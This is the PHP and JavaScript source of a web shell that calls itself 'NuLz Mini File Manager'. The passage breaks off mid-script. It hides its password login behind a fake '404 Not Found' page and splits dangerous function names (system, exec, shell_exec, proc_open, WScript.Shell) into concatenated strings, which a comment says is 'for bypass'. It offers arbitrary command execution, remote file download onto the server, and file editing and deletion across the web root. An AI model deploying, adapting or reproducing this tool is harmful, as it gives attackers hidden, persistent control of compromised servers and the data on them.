<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 'on');
ini_set("log_errors", 1);
ini_set("error_log", "nulz-fm-error.log");
//fm config
$fm_password = "a2de2636f9362c317e92719b23691b3a7609aef6882e06392a082a8be3c0cf64"; // change with sha256
$fm_name = 'NuLz Mini File Manager';
$fm_version = 'v1.0.0 BETA';
$fm_icon = "https://nulz-archive.vercel.app/archive/nulz.ico";
// Handle login request
if (isset($_POST['fm_login'])) {
    //header('Content-Type: application/json');
    $input_password = $_POST['fm_password'];
    $hashed_input = hash('sha256', $input_password);

    if ($hashed_input === $fm_password) {
        $_SESSION['logged_in'] = 'logged_in';
        $token = hash('sha256', $fm_password . 'secret_key');
        setcookie('auth_token', $token, time() + (86400), '/', '', true, true);
    } else {
        echo '<script>alert("Password Salah!")</script>';
    }
}
// Handle logout
if (isset($_GET['logout'])) {
    session_unset();
    session_destroy();
    setcookie('auth_token', '', time() - 3600, '/');
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (empty($_SESSION['logged_in'])) {
    ?>
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html>

    <head>
        <title>
            404 Not Found
        </title>
        <meta name="robots" content="noindex, nofollow">
    </head>

    <body>
        <form action="" method="post">
            <input type="text" name="fm_password" placeholder="input password">
            <button type="submit" name="fm_login" style="display: none;"></button>
        </form>
    </body>

    </html>
    <?php
    exit();
}
//string concat manipulation for bypass
$hayoloh = 'h' . 'tm' . 'lspe' . 'cialc' . 'hars';
$func_exist = 'fu' . 'nct' . 'ion' . '_' . 'ex' . 'ist' . 's';
$f_exist = "fil" . "e_exi" . "sts";
$f_size = "fi" . "les" . "ize";
$r_file = "re" . "ad" . "fi" . "le";
$rnd = 'ro' . 'un' . 'd';
$rnm = 're' . 'n' . 'am' . 'e';
$f_time = 'fi' . 'l' . 'em' . 'ti' . 'm' . 'e';
$str_time = 's' . 'tr' . 'to' . 'ti' . 'me';
$impld = 'im' . 'pl' . 'o' . 'de';
$b_name = "ba" . "sena" . "me";
$glb = 'g' . 'l' . 'o' . 'b';
$is_d = 'is' . '_' . 'd' . 'i' . 'r';
$is_f = 'is' . '_' . 'f' . 'i' . 'l' . 'e';
$unl = 'u' . 'n' . 'l' . 'i' . 'n' . 'k';
$ch_d = 'c' . 'h' . 'di' . 'r';
$rm_d = 'r' . 'm' . 'd' . 'i' . 'r';
$crl_init = 'c' . 'ur' . 'l' . '_' . 'in' . 'it';
$cr_ea_teF_old_er = "mk" . "d" . "ir";
$tch = 't' . 'ou' . 'c' . 'h';
$fo = 'fo' . 'p' . 'e' . 'n';
$fw = 'f' . 'wr' . 'it' . 'e';
$fc = 'f' . 'cl' . 'os' . 'e';
$fr = 'f' . 're' . 'a' . 'd';
$f_get = 'f' . 'il' . 'e' . '_' . 'g' . 'e' . 't' . '_' . 'co' . 'nten' . 't' . 's';
$f_put = 'f' . 'il' . 'e' . '_' . 'pu' . 't' . '_' . 'co' . 'n' . 'te' . 'nt' . 's';
$is_rsrc = 'is' . '_' . 're' . 'so' . 'ur' . 'ce';
$sgc = 's' . 'trea' . 'm_g' . 'et_c' . 'ont' . 'ents';
$proc = 'pr' . 'oc' . '_' . 'o' . 'pen';
$proc_cls = 'p' . 'ro' . 'c' . '_' . 'c' . 'lose';
$pop = 'p' . 'ope' . 'n';
$pop_cls = 'pc' . 'lose';
$exc = 'e' . 'x' . 'ec';
$sys = 's' . 'ys' . 't' . 'em';
$pass = 'pa' . 's' . 'sth' . 'ru';
$sh_exc = 's' . 'he' . 'll' . '_' . 'e' . 'xe' . 'c';
$com = 'C' . 'O' . 'M';
$wscsh = 'WS' . 'cr' . 'ipt' . '.' . 'S' . 'he' . 'll';
$cMdexe = 'c' . 'md' . '.' . 'e' . 'x' . 'e';
$preg = 'pr' . 'eg_' . 'mat' . 'ch';
$regex = '2' . '>' . '&' . '1';
$gflate = 'g' . 'zi' . 'nf' . 'l' . 'at' . 'e';
$b64 = 'b' . 'ase' . '6' . '4' . '_' . 'de' . 'co' . 'de';
$nelrts = 's' . 'tr' . 'l' . 'en';
$rhc = 'c' . 'h' . 'r';
$dro = 'o' . 'r' . 'd';
$f_perm = 'f' . 'il' . 'ep' . 'e' . 'r' . 'ms';
$u_n_a_me = "p" . "hp" . "_" . "un" . "ame";
$cw = "ge" . "tc" . "wd";
$scn_d = 'sc' . 'an' . 'd' . 'ir';
$d_name = 'd' . 'ir' . 'na' . 'm' . 'e';
$psx_euid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'te' . 'u' . 'i' . 'd';
$psx_egid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'te' . 'g' . 'i' . 'd';
$psx_usr_uid = 'p' . 'os' . 'ix' . '_' . 'g' . 'et' . 'pw' . 'u' . 'i' . 'd';
$psx_grp_gid = 'p' . 'os' . 'ix' . '_' . 'ge' . 'tg' . 'rg' . 'i' . 'd';
$myuid = 'g' . 'et' . 'my' . 'ui' . 'd';
$mygid = 'g' . 'et' . 'my' . 'gi' . 'd';
$cur_usr = 'g' . 'et' . '_' . 'cu' . 'rr' . 'en' . 't' . '_' . 'us' . 'er';
$own_f = 'fi' . 'le' . 'ow' . 'n' . 'er';
$grp_f = 'fi' . 'le' . 'gr' . 'ou' . 'p';
$g_host_name = 'g' . 'et' . 'ho' . 'st' . 'b' . 'yn' . 'am' . 'e';
$is_w = 'is' . '_' . 'wr' . 'it' . 'ab' . 'le';
$is_r = 'is' . '_' . 're' . 'ad' . 'ab' . 'le';
$muv = "m" . "ove" . "_up" . "loa" . "ded_fi" . "le";
$cp = 'c' . 'op' . 'y';
//icon library
$fontawesome_pro_version = 'v6.7.1'; //change if updated to new version
$fontawesome_pro = 'https://kit-pro.fontawesome.com/releases/' . $fontawesome_pro_version . '/css/pro.min.css';
$base_dir = rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
function get_files_and_folders($dir)
{
    global $func_exist;
    global $psx_usr_uid;
    global $psx_grp_gid;
    global $scn_d;
    global $b_name;
    global $is_d;
    global $is_f;
    $dir = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
    $items = array_diff($scn_d($dir), array('..', '.', $b_name(__FILE__)));
    $folders = [];
    $files = [];

    foreach ($items as $item) {
        $path = $dir . $item;
        $stat = stat($path);
        $user_info = $func_exist($psx_usr_uid) ? $psx_usr_uid($stat['uid']) : ['name' => $stat['uid']];
        $group_info = $func_exist($psx_grp_gid) ? $psx_grp_gid($stat['gid']) : ['name' => $stat['gid']];
        $info = [
            'name' => $item,
            'type' => $is_d($path) ? 'folder' : 'file',
            'size' => $is_f($path) ? filesize($path) : 0,
            'modified' => date('Y-m-d H:i:s', filemtime($path)),
            'owner' => $user_info['name'] . '/' . $group_info['name']
        ];
        if ($is_d($path))
            $folders[] = $info;
        else
            $files[] = $info;
    }
    sort($folders);
    sort($files);
    return ['folders' => $folders, 'files' => $files];
}

function NuLzUploadFile($this_file, $location)
{
    global $func_exist;
    global $muv;
    global $cp;
    if ($func_exist($muv)) {
        if (@$muv($this_file, $location)) {
            return true;
        } else {
            return false;
        }
    } elseif ($func_exist($cp)) {
        if (@$cp($this_file, $location)) {
            return true;
        } else {
            return false;
        }
    } else {
        return false;
    }
}

function NuLzCmd($komendnya)
{
    global $hayoloh;
    global $impld;
    global $fw;
    global $fc;
    global $fr;
    global $is_rsrc;
    global $sgc;
    global $proc;
    global $proc_cls;
    global $pop;
    global $pop_cls;
    global $exc;
    global $sys;
    global $pass;
    global $sh_exc;
    global $com;
    global $wscsh;
    global $cMdexe;
    global $func_exist;
    global $preg;
    global $regex;
    if (!$preg('/' . $regex . '/i', $komendnya)) {
        $komendnya = $komendnya . ' ' . $regex;
    }

    if ($func_exist($proc)) {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w'],
        ];
        $process = $proc($komendnya, $descriptors, $pipes);
        if ($is_rsrc($process)) {
            $fw($pipes[0], 'input_data_here');
            $fc($pipes[0]);
            $output = $sgc($pipes[1]);
            $errors = $sgc($pipes[2]);
            $fc($pipes[1]);
            $fc($pipes[2]);
            $resultCode = $proc_cls($process);
            return trim($hayoloh(stripslashes($output)));
        }
    } elseif ($func_exist($pop)) {
        $process = $pop($komendnya, 'r');
        $read = $fr($process, 2096);
        return trim($hayoloh(stripslashes(print_r("$process: " . gettype($process) . "\n$read \n"))));
        $pop_cls($process);
    } elseif ($func_exist($exc)) {
        $exc($komendnya, $output, $returnCode);
        if ($returnCode === 0) {
            $res = $impld($output);
            return trim($hayoloh(stripslashes($res)));
            ob_flush();
            flush();
        }
    } elseif ($func_exist($sys)) {
        $out = $sys($komendnya);
        return trim($hayoloh(stripslashes($out)));
    } elseif ($func_exist($pass)) {
        $out = $pass($komendnya);
        return trim($hayoloh(stripslashes($out)));
    } elseif ($func_exist($sh_exc)) {
        $out = $sh_exc($komendnya);
        return trim($hayoloh(stripslashes($out)));
    } elseif ($func_exist($com)) {
        $shell = new $com($wscsh);
        $kom_mand = "$cMdexe /c " . $komendnya;
        $output = $shell->Exec($kom_mand)->StdOut->ReadAll();
        return trim($hayoloh(stripslashes($output)));
    } else {
        return "The Function To Run The Command Is Disable On This Server";
    }
}

function NuLzCreateFile($filename, $filecontent)
{
    global $func_exist;
    global $fo;
    global $fw;
    global $fc;
    global $f_put;
    global $tch;
    if (empty($filename)) {
        return false;
    }

    if ($func_exist($fo)) {
        $c_r_e_a_t_e_f_i_l_e_1 = $fo($filename, 'w');
        if ($c_r_e_a_t_e_f_i_l_e_1 === false) {
            $c_r_e_a_t_e_f_i_l_e_2 = $f_put($filename, $filecontent);
            if ($c_r_e_a_t_e_f_i_l_e_2 === false) {
                $c_r_e_a_t_e_f_i_l_e_3 = $tch($filename);
                if ($c_r_e_a_t_e_f_i_l_e_3 === false) {
                    return false;
                } else {
                    return true;
                }
            } else {
                return true;
            }
        } else {
            if ($fw($c_r_e_a_t_e_f_i_l_e_1, $filecontent) === false) {
                return false;
            } else {
                return true;
                $fc($c_r_e_a_t_e_f_i_l_e_1);
            }
            $fc($c_r_e_a_t_e_f_i_l_e_1);
        }
    } elseif ($func_exist($f_put)) {
        $c_r_e_a_t_e_f_i_l_e_2 = $f_put($filename, "");
        if ($c_r_e_a_t_e_f_i_l_e_2 === false) {
            return false;
        } else {
            return true;
        }
    }
}

function NuLzReadFile($this_file)
{
    global $func_exist;
    global $f_get;
    global $fo;
    global $fr;
    global $fc;
    $content = '';
    if ($func_exist($fo)) {
        $fi_le = $fo($this_file, 'r');
        if ($fi_le) {
            while (!feof($fi_le)) {
                $content .= $fr($fi_le, 8192);
            }
            $fc($fi_le);
            return $content;
        } else {
            return false;
        }
    } elseif ($func_exist($f_get)) {
        $content = @$f_get($this_file);
        if ($content) {
            $headers = get_headers($this_file);
            if ($headers && strpos($headers[0], '403 Forbidden') !== false) {
                $content = NuLzCmd('cat "' . addslashes($this_file) . '"');
            }
            return $content;
        } else {
            return false;
        }
    } else {
        return false;
    }
}

function NuLzSaveFile($this_file, $filecontent)
{
    global $func_exist;
    global $f_put;
    global $fo;
    global $fw;
    if ($func_exist($fo)) {
        $editfi_le1 = $fo($this_file, 'w');
        if ($fw($editfi_le1, $filecontent)) {
            return true;
        } else {
            return false;
        }
    } elseif ($func_exist($f_put)) {
        $editfi_le2 = $f_put($this_file, $filecontent);
        if ($editfi_le2 === false) {
            return false;
        } else {
            return true;
        }
    } else {
        return false;
    }
}

function getSystemInfo()
{
    $disable_functions = ini_get('disable_functions');
    $info = [
        'kernel' => php_uname(),
        'server_ip' => $_SERVER['SERVER_ADDR'] ?? gethostbyname(gethostname()),
        'user_ip' => $_SERVER['REMOTE_ADDR'],
        'server_software' => $_SERVER['SERVER_SOFTWARE'],
        'php_version' => PHP_VERSION,
        'php_uname' => php_uname(),
        'disable_functions' => empty($disable_functions) ? 'NONE' : $disable_functions
    ];
    return $info;
}

if (isset($_POST['action'])) {
    header('Content-Type: application/json');
    try {
        $path = isset($_POST['path']) ? trim($_POST['path'], '/') : '';
        $target = $base_dir . $path;

        switch ($_POST['action']) {
            case 'list':
                $current_path = isset($_POST['path']) ? trim($_POST['path'], '/') : '';
                $page = isset($_POST['page']) ? (int) $_POST['page'] : 1;
                $per_page = 30;
                $target = $base_dir . $current_path;

                $result = get_files_and_folders($target);

                $total_items = count($result['folders']) + count($result['files']);
                $total_pages = ceil($total_items / $per_page);

                $start = ($page - 1) * $per_page;
                $all_items = array_merge($result['folders'], $result['files']);
                $items_slice = array_slice($all_items, $start, $per_page);

                // $folders = array_filter($items_slice, fn($item) => $item['type'] === 'folder');
                // $files = array_filter($items_slice, fn($item) => $item['type'] === 'file');
                $folders = array_filter($items_slice, function ($item) {
                    return $item['type'] === 'folder';
                });

                $files = array_filter($items_slice, function ($item) {
                    return $item['type'] === 'file';
                });

                echo json_encode([
                    'status' => 'success',
                    'folders' => array_values($folders),
                    'files' => array_values($files),
                    'current_path' => '/' . $current_path,
                    'pagination' => [
                        'current_page' => $page,
                        'total_pages' => $total_pages,
                        'total_items' => $total_items
                    ]
                ]);
                break;

            case 'upload':
                if (!empty($_FILES['file'])) {
                    if (NuLzUploadFile($_FILES['file']['tmp_name'], $target . '/' . $_FILES['file']['name']) === false) {
                        throw new Exception('Upload failed');
                    }
                    echo json_encode(['status' => 'success']);
                }
                break;

            case 'remote_upload':
                $url = $_POST['url'];
                $filename = $b_name(parse_url($url, PHP_URL_PATH));

                if (!filter_var($url, FILTER_VALIDATE_URL)) {
                    throw new Exception('URL tidak valid');
                }

                $ctx = stream_context_create([
                    'http' => [
                        'timeout' => 300,
                        'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                    ]
                ]);

                if ($func_exist($f_get)) {
                    $content = @$f_get($url, false, $ctx);
                } elseif ($func_exist($crl_init)) {
                    $ch = $crl_init();
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
                    curl_setopt($ch, CURLOPT_URL, $url);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
                    $content = curl_exec($ch);
                    curl_close($ch);
                } else {
                    $content = false;
                }

                if ($content === false) {
                    throw new Exception('Gagal mengunduh file');
                }

                $save_path = $target . '/' . $filename;
                if ($f_put($save_path, $content) === false) {
                    throw new Exception('Gagal menyimpan file');
                }

                echo json_encode(['status' => 'success']);
                break;

            case 'create_folder':
                if ($cr_ea_teF_old_er($target . '/' . $_POST['folder_name']) === false) {
                    throw new Exception('Gagal Membuat Folder');
                }
                echo json_encode(['status' => 'success']);
                break;

            case 'create_file':
                if (NuLzCreateFile($target . '/' . $_POST['filename'], '') === false) {
                    throw new Exception('Gagal Membuat File');
                }
                echo json_encode(['status' => 'success']);
                break;

            case 'rename':
                if ($rnm($base_dir . $_POST['old_path'], $base_dir . $_POST['new_path']) === false) {
                    throw new Exception('Rename failed');
                }
                echo json_encode(['status' => 'success']);
                break;

            case 'delete':
                $target = $base_dir . trim($_POST['path'], '/');
                if ($is_d($target)) {
                    $it = new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS);
                    $files = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                    foreach ($files as $file) {
                        if ($file->isDir())
                            $rm_d($file->getRealPath());
                        else
                            $unl($file->getRealPath());
                    }
                    $rm_d($target);
                } else
                    $unl($target);
                echo json_encode(['status' => 'success']);
                break;

            case 'read_file':
                $target = $base_dir . trim($_POST['path'], '/');
                if (!$f_exist($target)) {
                    throw new Exception('File tidak ditemukan');
                }

                $content = NuLzReadFile($target);
                $content = ($content === false || $content === null) ? '' : $content;

                echo json_encode([
                    'status' => 'success',
                    'content' => $content
                ]);
                break;

            case 'save_file':
                if (NuLzSaveFile($target, $_POST['content']) === false) {
                    throw new Exception('Gagal Menyimpan File');
                }
                echo json_encode(['status' => 'success']);
                break;

            case 'execute':
                $cmd = $_POST['cmd'] ?? '';
                if (!empty($cmd)) {
                    $current_path = isset($_POST['current_path']) ? trim($_POST['current_path'], '/') : '';
                    $work_dir = $base_dir . $current_path;

                    if ($current_path && is_dir($work_dir)) {
                        $ch_d($work_dir);
                    }

                    $output = NuLzCmd($cmd);
                    echo json_encode(['status' => 'success', 'output' => $output]);
                } else {
                    throw new Exception('Command tidak boleh kosong');
                }
                break;
            case 'sysinfo':
                echo json_encode([
                    'status' => 'success',
                    'data' => getSystemInfo()
                ]);
                break;
        }
    } catch (Exception $e) {
        echo json_encode(['status' => 'error', 'message' => $e->getMessage()]);
    }
    exit;
}

?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <title><?= $fm_name ?></title>
    <meta name="description" content="<?= $fm_name ?> Version <?= $fm_version ?>">
    <meta name="viewport" content="width=1024" />
    <meta name="robots" content="noindex, nofollow">
    <link rel="stylesheet" href="<?= $fontawesome_pro ?>">
    <script>
        function isDesktop() {
            return window.innerWidth >= 1024;
        }
        if (isDesktop()) {
            document.getElementById('viewport').setAttribute('content', 'width=1024');
        }
    </script>
    <style>
        :root {
            --bg-color: #f5f5f7;
            --text-white: #eaeaea;
            --text-color: #1d1d1f;
            --breadcrumb-bg: rgba(255, 255, 255, 0.8);
            --breadcrumb-color: #1d1d1f;
            --table-border: #d2d2d7;
            --td-hover: rgba(0, 0, 0, 0.05);
            --folder-row-bg: rgba(255, 255, 255, 0.9);
            --modal-bg: rgba(0, 0, 0, 0.5);
            --modal-content-bg: rgba(255, 255, 255, 0.95);
            --footer-bg: rgba(255, 255, 255, 0.8);
            --footer-color: #1d1d1f;
            --folder-icon-color: #de9502;
            --file-icon-color: #eaeaea;
            --moon-icon-color: #f5b12a;
            --sun-icon-color: #f5d02a;
            --link-color: #06c;
            --button-bg: #0071e3;
            --button-color: #fff;
            --cmd-bg: #000;
            --cmd-color: #00ff00;
            --lime-color: #05634d;
        }

        [data-theme="dark"] {
            --bg-color: #000000;
            --text-color: #f5f5f7;
            --breadcrumb-bg: rgba(28, 28, 30, 0.8);
            --breadcrumb-color: #f5f5f7;
            --table-border: #1d1d1f;
            --td-hover: rgba(255, 255, 255, 0.05);
            --folder-row-bg: rgba(28, 28, 30, 0.9);
            --modal-bg: rgba(0, 0, 0, 0.85);
            --modal-content-bg: rgba(28, 28, 30, 0.95);
            --footer-bg: rgba(0, 0, 0, 0.8);
            --footer-color: #f5f5f7;
            --link-color: #2997ff;
            --button-bg: #0071e3;
            --button-color: #fff;
            --cmd-bg: #000;
            --cmd-color: #00ff00;
            --lime-color: #0ee3b1;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            max-width: 1200px;
            margin: 20px auto;
            padding: 0 20px;
            background-color: var(--bg-color);
            color: var(--text-color);
            line-height: 1.5;
        }

        .mx-1 {
            margin: 1em 0 1em 0;
        }

        .my-1 {
            margin: 0 1em 0 1em;
        }

        .breadcrumb {
            background: var(--breadcrumb-bg);
            margin: 10px 0;
            padding: 15px;
            font-size: calc(20px + 1vw);
            font-weight: 700;
            color: var(--breadcrumb-color);
            border-radius: 15px;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
        }

        .breadcrumb a {
            color: var(--link-color);
            transition: opacity 0.2s;
        }

        .breadcrumb a:hover {
            opacity: 0.8;
        }

        a {
            text-decoration: none;
            color: var(--link-color);
        }

        a:hover {
            cursor: pointer;
        }

        table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
            background: var(--breadcrumb-bg);
            border-radius: 15px;
            overflow: hidden;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
        }

        th,
        td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid var(--table-border);
        }

        td:hover {
            background: var(--td-hover);
        }

        .folder-row {
            background: var(--folder-row-bg);
        }

        .folder_name {
            font-weight: 600;
        }

        .actions {
            display: flex;
            gap: 8px;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            transition: all 0.3s;
            background: var(--modal-bg);
            backdrop-filter: blur(5px);
            -webkit-backdrop-filter: blur(5px);
            animation: fade-in 0.5s ease-in;
            z-index: 9999999;
        }

        @keyframes fade-in {
            0% {
                opacity: 0;
            }

            100% {
                opacity: 1;
            }
        }

        .modal-content {
            background: var(--modal-content-bg);
            margin: 5% auto;
            padding: 25px;
            width: 90%;
            height: calc(500px + 80vh);
            font-size: calc(10px + 1vw);
            border-radius: 20px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
        }

        #fileContent {
            width: 100%;
            height: 90%;
            font-size: 12px;
            background: var(--bg-color);
            color: var(--lime-color);
            border: 1px solid var(--table-border);
            border-radius: 10px;
            padding: 10px;
        }

        .editInfo {
            float: right;
            display: flex;
            flex-direction: column;
            padding: 10px;
        }

        button {
            padding: 8px 16px;
            cursor: pointer;
            background: var(--button-bg);
            color: var(--button-color);
            border: none;
            border-radius: 20px;
            font-weight: 500;
            transition: all 0.2s ease;
        }

        button:hover {
            opacity: 0.9;
            transform: translateY(-1px);
        }

        input[type="text"],
        input[type="file"] {
            padding: 8px 12px;
            border: 1px solid var(--table-border);
            border-radius: 10px;
            background: var(--bg-color);
            color: var(--text-color);
        }

        .tools {
            background: var(--breadcrumb-bg);
            padding: 20px;
            border-radius: 15px;
            margin: 20px 0;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
        }

        #cmdOutput {
            background: var(--cmd-bg) !important;
            color: var(--cmd-color) !important;
            border-radius: 10px;
            font-family: "SF Mono", Monaco, monospace;
        }

        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            padding: 15px;
            background: var(--footer-bg);
            color: var(--footer-color);
            text-align: center;
            font-size: 14px;
            z-index: 1000;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
        }

        .footer a {
            color: var(--footer-color);
            font-weight: 600;
        }

        .theme-switch {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
            display: flex;
            gap: 10px;
            z-index: 99999999;
        }

        #pagination {
            margin-bottom: 70px;
        }

        #pagination button {
            margin: 0 5px;
        }

        * {
            transition: background-color 0.3s, color 0.3s;
        }

        .notification {
            padding: 12px 24px;
            border-radius: 10px;
            color: #fff;
            font-weight: 500;
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
            animation: slideDown 0.3s ease-out;
        }

        .notification.success {
            background: rgba(46, 160, 67, 0.9);
        }

        .notification.error {
            background: rgba(218, 54, 51, 0.9);
        }

        @keyframes slideDown {
            from {
                transform: translateY(-100%) translateX(-50%);
                opacity: 0;
            }

            to {
                transform: translateY(0) translateX(-50%);
                opacity: 1;
            }
        }
    </style>
</head>

<body>
    <div id="notification"
        style="display: none; position: fixed; top: 20px; left: 50%; transform: translateX(-50%); z-index: 9999;"></div>
    <h1><?= $fm_name ?></h1>
    <p>Version: <?= $fm_version ?></p>
    <div class="theme-switch">
        <button onclick="showSysInfo()"><i class="fa-duotone fa-regular fa-server"></i> System Info</button>
        <button onclick="toggleTheme()" id="themeBtn"><i class="fa-duotone fa-regular fa-moon-stars"
                style="color: var(--moon-icon-color);"></i> Dark Mode</button>
    </div>
    <div id="sysInfoModal" class="modal">
        <div class="modal-content">
            <h3>System Information</h3>
            <div id="sysInfoContent"></div>
            <button onclick="document.getElementById('sysInfoModal').style.display='none'">Close</button>
        </div>
    </div>
    <div id="breadcrumb" class="breadcrumb"></div>
    <div style="margin: 10px 0;" class="tools">
        <input type="file" id="uploadFile"><button onclick="uploadFile()">Upload</button>
        <div class="mx-1">
            <input type="text" id="remoteUrl" placeholder="Remote URL"><button onclick="remoteUpload()">Remote
                Upload</button>
        </div>
        <div class="mx-1">
            <input type="text" id="newFolder" placeholder="Nama Folder"><button onclick="createFolder()">Buat
                Folder</button>
            <input type="text" id="newFile" placeholder="Nama File"><button onclick="createFile()">Buat File</button>
        </div>
        <div class="mx-1">
            <div class="mx-1">
                <h3>Command Execution</h3>
                <div style="display: flex; gap: 10px; margin-bottom: 10px;">
                    <input type="text" id="cmdInput" style="flex: 1; padding: 8px;" placeholder="Enter command...">
                    <button onclick="executeCmd()">Execute</button>
                </div>
                <textarea id="cmdOutput"
                    style="width: 100%; height: 400px; background: #000; color: #0f0; padding: 10px; font-family: monospace;"
                    readonly></textarea>
            </div>

            <table>
        </div>
    </div>

    <table>
        <thead>
            <tr>
                <th>Nama</th>
                <th>Size</th>
                <th>Last Update</th>
                <th>Owner</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody id="fileList"></tbody>
    </table>

    <div id="pagination" style="margin-top: 20px; text-align: center;"></div>

    <div id="editModal" class="modal">
        <div class="modal-content">
            <button onclick="saveFile()">Simpan</button>
            <button onclick="closeModal()">Close</button>
            <div class="editInfo">
                <span>ctrl + s = SAVE</span>
                <span>ctrl + x = CLOSE</span>
                <span>ESC = CLOSE</span>
            </div>
            <textarea id="fileContent"></textarea>
        </div>
    </div>

    <script>
        let currentPath = '';
        let editingFile = '';
        let currentPage = 1;

        function showNotification(message, type = 'success') {
            const notification = document.getElementById('notification');
            notification.className = `notification ${type}`;
            notification.textContent = message;
            notification.style.display = 'block';

            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }

        function setTheme(theme) {
            document.documentElement.setAttribute('data-theme', theme);
            localStorage.setItem('theme', theme);
            const btn = document.getElementById('themeBtn');
            if (theme === 'dark') {
                btn.innerHTML = '<i class="fa-duotone fa-solid fa-sun-cloud" style="color: var(--sun-icon-color);"></i> Light Mode';
            } else {
                btn.innerHTML = '<i class="fa-duotone fa-regular fa-moon-stars" style="color: var(--moon-icon-color);"></i> Dark Mode';
            }
        }

        function showSysInfo() {
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=sysinfo'
            })
                .then(r => r.json())
                .then(response => {
                    if (response.status === 'success') {
                        const info = response.data;
                        let html = `
                <table style="margin-top: 10px;">
                    <tr><td><b>Kernel</b></td><td>: ${info.kernel}</td></tr>
                    <tr><td><b>Server IP</b></td><td>: ${info.server_ip}</td></tr>
                    <tr><td><b>Your IP</b></td><td>: ${info.user_ip}</td></tr>
                    <tr><td><b>Server Software</b></td><td>: ${info.server_software}</td></tr>
                    <tr><td><b>PHP Version</b></td><td>: ${info.php_version}</td></tr>
                    <tr><td><b>Disable Functions</b></td><td>: ${info.disable_functions}</td></tr>
                </table>
            `;
                        document.getElementById('sysInfoContent').innerHTML = html;
                        document.getElementById('sysInfoModal').style.display = 'block';
                    }
                });
        }

        function toggleTheme() {
            const currentTheme = localStorage.getItem('theme') || 'light';
            const newTheme = currentTheme === 'light' ? 'dark' : 'light';
            setTheme(newTheme);
        }

        window.onclick = function (event) {
            const modal = document.getElementById('sysInfoModal');
            if (event.target === modal) {
                modal.style.display = 'none';
            }
        }

        // Load saved theme
        document.addEventListener('DOMContentLoaded', () => {
            const savedTheme = localStorage.getItem('theme') || 'light';
            setTheme(savedTheme);
        });

        function formatSize(bytes) {
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(1024));
            return Math.floor(bytes / Math.pow(1024, i)) + ' ' + sizes[i];
        }

        function updateBreadcrumb(path) {
            const parts = path.split('/').filter(Boolean);
            let html = '<a href="#" onclick="navigateTo(\'\')">[ HOME DIR ]</a>';
            let fullPath = '';
            parts.forEach(part => {
                fullPath += part + '/';
                html += ` / <a href="#" onclick="navigateTo('${fullPath}')">${part}</a>`;
            });
            document.getElementById('breadcrumb').innerHTML = html;
        }

        function loadFiles() {
            fetch('', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `action=list&path=${encodeURIComponent(currentPath)}&page=${currentPage}`
            })
                .then(r => r.json())
                .then(data => {
                    if (data.status !== 'success') return;
                    updateBreadcrumb(data.current_path);

                    const foldersHtml = data.folders.map(f => `
            <tr class="folder-row">
                <td><i class="fa-duotone fa-light fa-folder-closed" style="color: var(--folder-icon-color);"></i> <a href="#" class="folder_name" onclick="navigateTo('${currentPath}${f.name}/')">${f.name}</a></td>
                <td>-</td><td>${f.modified}</td><td>${f.owner}</td>
                <td class="actions">
                    <button onclick="renameItem('${f.name}')">Rename</button>
                    <button onclick="deleteItem('${f.name}')">Delete</button>
                </td>
            </tr>
        `).join('');

                    const filesHtml = data.files.map(f => `
            <tr>
                <td><i class="fa-solid fa-memo"></i> <a href="#" onclick="editFile('${f.name}')">${f.name}</a></td>
                <td>${formatSize(f.size)}</td><td>${f.modified}</td><td>${f.owner}</td>
                <td class="actions">
                    <button onclick="editFile('${f.name}')">Edit</button>
                    <button onclick="renameItem('${f.name}')">Rename</button>
                    <button onclick="deleteItem('${f.name}')">Delete</button>
                </td>
            </tr>
        `).join('');

                    document.getElementById('fileList').innerHTML = foldersHtml + filesHtml;

                    // Update pagination
                    updatePagination(data.pagination);
                });
        }

        function updatePagination(pagination) {
            const { current_page, total_pages, total_items } = pagination;
            if (total_pages <= 1) {
                document.getElementById('pagination').innerHTML = '';
                return;
            }

            let paginationHtml = `<div style="margin-bottom: 60px;">`;
            paginationHtml += `<div style="margin-bottom: 10px;">Total: ${total_items} items</div>`;

            if (current_page > 1) {
                paginationHtml += `<button onclick="changePage(${current_page - 1})">Previous</button> `;
            }

            for (let i = 1; i <= total_pages; i++) {
                if (i === current_page) {
